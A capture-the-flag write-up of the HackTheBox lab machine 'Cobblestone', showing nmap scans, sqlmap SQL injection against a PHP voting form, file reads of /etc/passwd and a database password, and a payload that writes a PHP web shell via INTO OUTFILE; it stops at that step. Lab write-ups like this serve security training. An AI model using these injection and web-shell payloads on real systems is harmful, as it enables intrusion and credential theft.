# Cobblestone Linux Insane HTB Machine Writeup

## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV 10.129.232.170 -v
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-06 19:47 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Initiating Ping Scan at 19:47
Scanning 10.129.232.170 [4 ports]
Completed Ping Scan at 19:47, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:47
Completed Parallel DNS resolution of 1 host. at 19:47, 0.50s elapsed
Initiating SYN Stealth Scan at 19:47
Scanning 10.129.232.170 [1000 ports]
Discovered open port 80/tcp on 10.129.232.170
Discovered open port 22/tcp on 10.129.232.170
Completed SYN Stealth Scan at 19:47, 2.04s elapsed (1000 total ports)
Initiating Service scan at 19:47
Scanning 2 services on 10.129.232.170
Completed Service scan at 19:47, 6.39s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.232.170.
Initiating NSE at 19:47
Completed NSE at 19:47, 5.28s elapsed
Initiating NSE at 19:47
Completed NSE at 19:47, 0.73s elapsed
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Nmap scan report for 10.129.232.170
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
|_  256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.62
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://cobblestone.htb/
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.63 seconds
Raw packets sent: 1028 (45.208KB) | Rcvd: 1001 (40.048KB)
```
## Web Emuneration
In `http://cobblestone.htb/` found `deploy.cobblestone.htb` and `vote.cobblestone.htb`, tried registering and logging in `vote.cobblestone.htb`, in `suggest` tab there is a form that we can leverage.
Save the request in Burp Suite:
```
POST /suggest.php HTTP/1.1
Host: vote.cobblestone.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Origin: http://vote.cobblestone.htb
Connection: keep-alive
Referer: http://vote.cobblestone.htb/index.php
Cookie: PHPSESSID=hdpm6n98c5vfgdinrkg17eiadq
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=a
```
Search vulnerabilities with `sqlmap`:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/cobblestone]
└─$ sqlmap -r request --batch 
        ___
       __H__                                                                                                                       
 ___ ___[(]_____ ___ ___  {1.10.2#stable}                                                                                          
|_ -| . [(]     | .'| . |                                                                                                          
|___|_  [,]_|_|_|__,|  _|                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:57:42 /2026-07-06/

[19:57:42] [INFO] parsing HTTP request from 'request'
[19:57:42] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=5'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[19:57:43] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:57:43] [INFO] testing if the target URL content is stable
[19:57:43] [WARNING] POST parameter 'url' does not appear to be dynamic
[19:57:44] [WARNING] heuristic (basic) test shows that POST parameter 'url' might not be injectable
[19:57:44] [INFO] testing for SQL injection on POST parameter 'url'
[19:57:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:57:46] [INFO] POST parameter 'url' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[19:57:55] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[19:57:55] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:57:56] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:57:56] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[19:57:56] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[19:57:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[19:57:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[19:57:58] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[19:57:58] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[19:57:58] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[19:57:59] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[19:58:00] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:58:00] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:58:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[19:58:01] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[19:58:01] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:58:02] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[19:58:02] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[19:58:02] [WARNING] reflective value(s) found and filtering out
[19:58:03] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[19:58:03] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[19:58:03] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[19:58:03] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[19:58:03] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[19:58:03] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[19:58:03] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[19:58:03] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[19:58:03] [INFO] testing 'Generic inline queries'
[19:58:04] [INFO] testing 'MySQL inline queries'
[19:58:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[19:58:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[19:58:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[19:58:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[19:58:06] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[19:58:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[19:58:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:58:18] [INFO] POST parameter 'url' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[19:58:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:58:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:58:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[19:58:21] [INFO] target URL appears to have 5 columns in query
[19:58:26] [INFO] POST parameter 'url' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'url' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 3163=3163 AND 'QhHO'='QhHO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 8585 FROM (SELECT(SLEEP(5)))zIvN) AND 'TZHa'='TZHa

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-7647' UNION ALL SELECT CONCAT(0x7170767171,0x74544a6e7353586d544b5452417268786f7271466d7742574664496368777a4251674d4c68635946,0x7171627671),NULL,NULL,NULL,NULL-- -
---
[19:58:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:58:26] [INFO] fetched data logged to text files under '/home/jameskaois/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 19:58:26 /2026-07-06/

```
The result:
```
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 3163=3163 AND 'QhHO'='QhHO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 8585 FROM (SELECT(SLEEP(5)))zIvN) AND 'TZHa'='TZHa

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-7647' UNION ALL SELECT CONCAT(0x7170767171,0x74544a6e7353586d544b5452417268786f7271466d7742574664496368777a4251674d4c68635946,0x7171627671),NULL,NULL,NULL,NULL-- -
```
Tried some more `sqlmap` commands:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/cobblestone]
└─$ sqlmap -r request --batch --dbs
        ___
       __H__                                                                                                                       
 ___ ___[(]_____ ___ ___  {1.10.2#stable}                                                                                          
|_ -| . [.]     | .'| . |                                                                                                          
|___|_  [,]_|_|_|__,|  _|                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:05:38 /2026-07-06/

[20:05:38] [INFO] parsing HTTP request from 'request'
[20:05:38] [INFO] resuming back-end DBMS 'mysql' 
[20:05:38] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=7'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 3163=3163 AND 'QhHO'='QhHO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 8585 FROM (SELECT(SLEEP(5)))zIvN) AND 'TZHa'='TZHa

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-7647' UNION ALL SELECT CONCAT(0x7170767171,0x74544a6e7353586d544b5452417268786f7271466d7742574664496368777a4251674d4c68635946,0x7171627671),NULL,NULL,NULL,NULL-- -
---
[20:05:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:05:38] [INFO] fetching database names
[20:05:39] [WARNING] reflective value(s) found and filtering out
available databases [2]:
[*] information_schema
[*] vote

[20:05:39] [INFO] fetched data logged to text files under '/home/jameskaois/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 20:05:39 /2026-07-06/

```
Got `/etc/passwd` through `sqlmap -r request --batch --file-read="/etc/passwd"
`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
cobble:x:1000:1000:cobble,,,:/home/cobble:/bin/rbash
mysql:x:103:112:MySQL Server,,,:/nonexistent:/bin/false
tftp:x:104:113:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false
john:x:1001:1001:,,,:/home/john:/bin/bash
```
Got `/var/www/vote/db/connection.php`:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/cobblestone]
└─$ cat /home/jameskaois/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_vote_db_connection.php
<?php

$dbserver = "localhost";
$username = "voteuser";
$password = "thaixu6eih0Iicho]irahvoh6aigh>ie";
$dbname = "vote";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
?>               
```
`/etc/apache2/sites-available/000-default.conf`:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/cobblestone]
└─$ cat /home/jameskaois/.local/share/sqlmap/output/vote.cobblestone.htb/files/_etc_apache2_sites-available_000-default.conf
<VirtualHost *:80>
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]
        ServerName 127.0.0.1
        ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
        ProxyPassReverse "/cobbler_api" "http://127.0.0.1:25151/"
</VirtualHost>

<VirtualHost *:80>
        ServerName cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/html

        <Directory /var/www/html>
                AAHatName cobblestone
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]

        Alias /cobbler /srv/www/cobbler

        <Directory /srv/www/cobbler>
                Options Indexes FollowSymLinks
                AllowOverride None
                Require all granted
        </Directory>

</VirtualHost>

<VirtualHost *:80>
        ServerName deploy.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/deploy

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^deploy.cobblestone.htb$
        RewriteRule /.* http://deploy.cobblestone.htb/ [R]
</VirtualHost>

<VirtualHost *:80>
        ServerName vote.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/vote

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^vote.cobblestone.htb$
        RewriteRule /.* http://vote.cobblestone.htb/ [R]
</VirtualHost>

```
## Web Exploiting
Leverage the `UNION query` to upload our malicious web shell:
```
url=' union select 1,2,3,"<?php system($_GET['cmd']);?>",5 INTO OUTFILE '/var/www/vote/shell.php' -- -
```